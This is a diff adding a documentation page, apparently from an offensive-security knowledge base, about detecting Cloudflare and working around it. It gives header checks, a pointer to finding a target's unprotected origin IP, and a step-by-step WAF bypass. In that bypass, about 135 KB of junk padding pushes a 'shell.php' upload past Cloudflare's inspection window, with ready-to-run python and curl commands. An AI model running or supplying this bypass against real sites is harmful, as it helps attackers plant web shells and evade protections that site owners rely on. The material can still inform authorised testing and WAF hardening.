@@ -1,0 +1,98 @@
+---
+title: Cloudflare
+description: Identifying and working around Cloudflare as a fronting WAF/CDN.
+---
+
+Cloudflare is the most common WAF/CDN fronting a target, which means most
+requests to the domain hit Cloudflare's edge rather than the real origin
+server.
+
+## Detecting Cloudflare
+
+<CommandInput
+  vars={{ target_domain: "example.com" }}
+  command={`curl -sI "https://{{target_domain}}" | grep -i "^server:\\|^cf-ray:\\|^cf-cache-status:"`}
+  lang="bash"
+  placeholderMode
+/>
+
+**What it does:**
+
+- `curl -sI` — fetches only the response headers (`-I`), silently (`-s`,
+  suppresses the progress meter).
+- `grep -i "^server:\|^cf-ray:\|^cf-cache-status:"` — filters for the
+  headers Cloudflare's edge adds to virtually every response it proxies.
+
+**Expected result:** a match on any of these is a strong signal the domain
+sits behind Cloudflare:
+
+| Header | Meaning |
+| --- | --- |
+| `Server: cloudflare` | Cloudflare's edge identifies itself directly (can be spoofed/stripped by other services, so treat as a lead, not proof on its own). |
+| `CF-RAY` | A unique per-request ID Cloudflare stamps on every response it proxies — the most reliable of the three. |
+| `cf-cache-status` | Present when the response passed through Cloudflare's caching layer. |
+
+<Callout type="info">
+  No match doesn't rule out Cloudflare — some configurations strip these
+  headers. Absence is inconclusive; presence is a strong positive.
+</Callout>
+
+## Finding the real origin IP
+
+See [IP (Censys)](/docs/network-cert-intelligence/ip) for the Censys Search
+query used to find a target's real origin IP behind Cloudflare — it
+excludes Cloudflare-fingerprinted hosts so what's left are candidate origin
+IPs, which may be reachable directly (bypassing Cloudflare's
+WAF/rate-limiting/DDoS protection) if not properly firewalled to only
+accept Cloudflare's IP ranges.
+
+## Bypassing the WAF file-upload filter (body-padding technique)
+
+Cloudflare's managed WAF rules only inspect the **first ~128 KiB (131,072
+bytes)** of a request body by default, for performance reasons — bytes
+after that window pass through unscanned. A `multipart/form-data` upload
+that places an oversized junk field **before** the real `file` field pushes
+the filename, declared `Content-Type`, and file content past that window,
+so a normally-blocked extension (e.g. `.php`) never gets scanned at the
+edge — while the origin application still receives and processes the full
+body.
+
+### 1. Generate the padding
+
+<CommandInput
+  vars={{ padding_bytes: "135000" }}
+  command={`python3 -c "open('junk.txt', 'wb').write(b'A' * {{padding_bytes}})"`}
+  lang="bash"
+  placeholderMode
+/>
+
+`padding_bytes` needs to land past the ~131,072-byte inspection limit — a
+confirmed bypass measured the real threshold at roughly 130,850–131,000
+bytes by binary search, so a value a few KB above 131,072 gives comfortable
+margin.
+
+### 2. Upload with the padding field ahead of the payload
+
+<CommandInput
+  vars={{ target_domain: "example.com", upload_path: "upload", payload_file: "shell.php" }}
+  command={`curl -sk -i -X POST "https://{{target_domain}}/{{upload_path}}" \\
+  -F "padding=<junk.txt" \\
+  -F "file=@{{payload_file}};type=application/x-php" \\
+  -F "prefix=test"`}
+  lang="bash"
+  placeholderMode
+/>
+
+**What it does:**
+
+| Part | Purpose |
+| --- | --- |
+| `-F "padding=<junk.txt"` | A filler form field sent **before** `file` — `curl` serializes `-F` fields in the order given, so this is the first part in the multipart body and is what consumes the WAF's inspection window. |
+| `-F "file=@{{payload_file}};type=application/x-php"` | The actual payload, with the extension/MIME type that would otherwise trigger a 403 from the WAF — now sitting entirely outside the inspected window. |
+| `-F "prefix=test"` | Example of an app-required form field beyond the file itself; adjust/remove to match the target endpoint's actual parameters. |
+
+A 200/success response here only proves the edge WAF's extension/MIME
+filter was bypassed — it does not by itself prove remote code execution.
+Confirm separately whether the upload path is served as static bytes (no
+RCE) or actually interpreted/executed by the backend before treating this
+as more than an unauthenticated-write/stored-content finding.
